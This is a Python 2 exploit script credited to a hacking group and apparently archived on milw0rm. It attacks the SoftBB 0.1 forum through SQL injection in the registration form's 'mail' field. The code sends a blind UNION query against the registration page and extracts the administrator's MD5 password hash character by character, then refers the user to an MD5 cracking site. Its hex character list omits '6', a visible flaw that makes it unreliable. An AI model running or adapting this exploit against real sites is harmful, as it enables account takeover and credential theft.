#!/usr/bin/env python
# LOTFREE TEAM 03/2006
# http://lotfree.next-touch.com/
# http://membres.lycos.fr/lotfree/sploits/LOTF-SoftBB.py
#
# Vulnerability info
# Product : SoftBB
# Version : 0.1
#
# The field 'mail' in reg.php is used directly in a SQL query :
# $sql = 'SELECT pseudo,mail FROM '.$prefixtable.'membres WHERE pseudo = "'.add_gpc($pseudoreg).'" OR mail = "'.$mail.'"';
# We can deduce deduce the result of some sql querys according to the error messages returned
# The exploit test the characters of the md5 hash one by one using a special query
import httplib, urllib

# Change the following values...
admin="admin"
server="localhost"
path="/forum"
#
hash=""
chars=('a','b','c','d','e','f','1','2','3','4','5','7','8','9','0')

print "LOTFREE TEAM SoftBB BruteForcing tool"
print "-------------------------------------"
for i in range(1,33):
  print "Brute forcing hash["+str(i)+"]"
  for a in chars:
    params=urllib.urlencode({'pseudo':admin,
    'mdp':'1',
    'mdpc':'1',
    'mail':'" union select pseudo,1 from softbb_membres where pseudo="'+admin+'" and substr(mdp,'+str(i)+',1)="'+a+'" limit 1,1#',
    'condok':'true'})
    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    conn = httplib.HTTPConnection(server)
    conn.request("POST", path+"/index.php?page=reg", params, headers)
    response = conn.getresponse()
    data = response.read()
    conn.close()
    if data.find("Ce pseudonyme est d")>0:
      hash=hash+a
      continue

print
if len(hash)==32:
  print "Found hash =",hash,"for account",admin
  print "You can use http://md5.rednoize.com/ to crack the md5 hash"
else:
  print "Exploit failed... verify the path to the forum or try changing the limit 1,1 in the sql request..."

# milw0rm.com [2006-03-19]